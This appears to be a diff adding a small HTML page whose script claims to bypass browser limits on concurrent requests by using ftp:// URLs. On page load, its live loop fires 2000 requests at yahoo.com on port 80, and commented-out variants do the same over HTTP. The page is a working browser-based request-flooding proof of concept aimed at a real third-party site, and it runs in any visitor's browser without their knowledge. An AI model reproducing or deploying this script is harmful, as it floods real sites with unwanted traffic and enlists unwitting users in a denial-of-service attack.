@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+/***********************************************************
+* The browser limits the number of concurrent http request to a max of 6 or 7, but this script
+* shows how using ftp we can bypass the browsers limit on the number of concurrent request to a single 
+* website. 
+*
+* Written by Adam
+* 8-13-13
+*************************************************************/
+/*
+//retrieving and displaying images
+for(var i=0; i<300; i++)
+{
+var img = new Image();
+//request and display an image
+var url = 'http://cs.jmu.edu/images/wordmark.gif';
+img.src = url;
+document.body.appendChild(img);
+}
+*/
+/*
+//limited http concurrent requests
+for(var i=0; i<2000; i++)
+{
+var img = new Image();
+//request a yahoo.com,the browser limits the number of concurrent requests
+var url = 'http://www.yahoo.com/?' +i;
+img.src = url;
+}
+*/
+//unlimited ftp concurrent requests
+for(var i=0; i<2000; i++)
+{
+var img = new Image();
+//request a yahoo.com concurrently
+var url = 'ftp://www.yahoo.com:80/?' +i;
+img.src = url;
+}
+</script>
+</body>
+</html>
